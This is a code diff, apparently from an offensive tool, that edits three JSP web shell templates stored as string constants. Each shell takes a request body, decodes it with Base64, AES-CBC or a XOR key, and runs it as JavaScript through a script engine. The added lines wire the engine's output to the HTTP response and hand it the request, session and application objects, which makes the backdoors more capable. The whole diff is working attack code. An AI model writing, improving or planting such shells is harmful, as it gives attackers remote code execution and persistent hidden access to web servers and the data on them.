@@ -47,6 +47,7 @@ const jspRawShell = `<%@ page import="java.util.*,javax.script.*" %>
 byte[] body = request.getInputStream().readAllBytes();
 byte[] dec = Base64.getDecoder().decode(new String(body));
 ScriptEngine se = new ScriptEngineManager().getEngineByName("javascript");
+try { se.getContext().setWriter(new java.io.PrintWriter(out)); se.getContext().setErrorWriter(new java.io.PrintWriter(out)); se.put("request", request); se.put("response", response); se.put("session", session); se.put("application", application); se.put("out", out); se.put("pageContext", pageContext); } catch (Exception ignore) {}
 se.eval(new String(dec, "UTF-8"));
 %>`
 
@@ -70,6 +71,7 @@ Cipher c = Cipher.getInstance("AES/CBC/PKCS5Padding");
 c.init(Cipher.DECRYPT_MODE, key, iv);
 byte[] p = c.doFinal(enc);
 ScriptEngine se = new ScriptEngineManager().getEngineByName("javascript");
+try { se.getContext().setWriter(new java.io.PrintWriter(out)); se.getContext().setErrorWriter(new java.io.PrintWriter(out)); se.put("request", request); se.put("response", response); se.put("session", session); se.put("application", application); se.put("out", out); se.put("pageContext", pageContext); } catch (Exception ignore) {}
 se.eval(new String(p, "UTF-8"));
 %>`
 
@@ -91,6 +93,7 @@ byte[] p = new byte[enc.length];
 byte[] kb = k.getBytes("UTF-8");
 for (int i = 0; i < enc.length; i++) p[i] = (byte)(enc[i] ^ kb[i % 16]);
 ScriptEngine se = new ScriptEngineManager().getEngineByName("javascript");
+try { se.getContext().setWriter(new java.io.PrintWriter(out)); se.getContext().setErrorWriter(new java.io.PrintWriter(out)); se.put("request", request); se.put("response", response); se.put("session", session); se.put("application", application); se.put("out", out); se.put("pageContext", pageContext); } catch (Exception ignore) {}
 se.eval(new String(p, "UTF-8"));
 %>`
 
